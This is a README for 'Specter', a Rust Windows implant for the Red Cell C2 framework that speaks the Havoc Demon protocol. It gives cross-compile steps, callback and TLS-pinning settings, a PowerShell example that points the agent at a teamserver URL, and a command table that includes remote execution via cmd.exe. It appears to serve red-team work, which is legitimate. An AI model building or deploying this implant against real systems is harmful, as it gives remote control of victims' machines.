# Specter — Windows Rust Agent

Specter is a Windows implant for Red Cell C2. It implements the Havoc Demon binary
protocol over HTTP and checks in to a running Red Cell teamserver to receive tasks.

## Protocol compatibility

Specter uses the same Demon wire framing as the original Havoc agent:

- `0xDEADBEEF` magic value in every packet header
- AES-256-CTR encryption with per-agent session keys
- `DEMON_INIT` (command ID 99) registration handshake
- `COMMAND_GET_JOB` (1) polling loop
- `COMMAND_CHECKIN` (100) metadata report
- Monotonic CTR mode — the counter advances across packets rather than resetting

## Cross-compile from Linux

### Prerequisites

Install the MinGW-w64 toolchain (provides the `x86_64-w64-mingw32-gcc` linker):

```bash
sudo apt-get install mingw-w64
```

Add the Windows GNU target to your Rust toolchain:

```bash
rustup target add x86_64-pc-windows-gnu
```

### Debug build

```bash
cargo build -p specter --target x86_64-pc-windows-gnu
```

The resulting binary is at:

```
target/x86_64-pc-windows-gnu/debug/specter.exe
```

### Release build

```bash
cargo build -p specter --release --target x86_64-pc-windows-gnu
```

The resulting binary is at:

```
target/x86_64-pc-windows-gnu/release/specter.exe
```

### Linker configuration

Cargo picks up the MinGW linker automatically via the target triple.  If your
`x86_64-w64-mingw32-gcc` is not on `PATH`, set the linker explicitly:

```bash
export CARGO_TARGET_X86_64_PC_WINDOWS_GNU_LINKER=x86_64-w64-mingw32-gcc
cargo build -p specter --target x86_64-pc-windows-gnu
```

Or add it permanently to `.cargo/config.toml`:

```toml
[target.x86_64-pc-windows-gnu]
linker = "x86_64-w64-mingw32-gcc"
```

### TLS certificate pinning (optional)

To bake a specific teamserver certificate into the binary at compile time:

```bash
SPECTER_PINNED_CERT_PEM="$(cat teamserver.pem)" \
  cargo build -p specter --release --target x86_64-pc-windows-gnu
```

## Usage

```
specter.exe

Environment variables:
  SPECTER_SERVER       Teamserver callback URL (e.g. https://10.0.0.1:443/callback)
  SPECTER_SLEEP        Callback interval in milliseconds (default: 5000)
  SPECTER_JITTER       Sleep jitter percentage 0-100 (default: 0)
  SPECTER_INIT_SECRET  HKDF init secret matching the listener configuration
  SPECTER_CERT_PIN     PEM-encoded teamserver certificate for TLS pinning
```

> **Note:** Specter currently reads configuration only from environment variables and
> compiled-in defaults.  Command-line flag support will be added in a later phase.

### Minimal example (PowerShell)

```powershell
$env:SPECTER_SERVER = "https://192.168.1.10:443/havoc"
.\specter.exe
```

The agent registers once (`DEMON_INIT`), then polls for jobs at the configured
interval.  On first checkin the agent appears in the Red Cell client agent list.

## Architecture

```
main.rs           entry point — logging init, config load, run loop
config.rs         SpecterConfig — env var and compiled-in defaults
agent.rs          SpecterAgent — registration → poll → dispatch loop
protocol.rs       Demon packet builders and response parsers
transport.rs      HTTP transport backed by reqwest (rustls, optional cert pinning)
dispatch.rs       task dispatch handlers (exec via cmd.exe, exit, fs, proc, sleep)
platform.rs       Win32 native APIs (RtlGetVersion, GetComputerNameExW)
error.rs          SpecterError type
```

## Implemented commands

| Command | Description |
|---|---|
| `COMMAND_EXIT` | Terminate the agent process |
| `COMMAND_SLEEP` | Update callback interval and jitter |
| `COMMAND_PROC` / Create | Execute a command via `cmd.exe /c` (Windows) or `/bin/sh -c` (Linux CI) |
| `COMMAND_FS` / PWD, CD, Dir | Filesystem navigation and directory listing |

## Tests

```bash
# Unit and integration tests (runs on the build host — no network required)
cargo test -p specter

# Cross-compile check (verifies Windows target compiles without errors)
cargo check -p specter --target x86_64-pc-windows-gnu
```
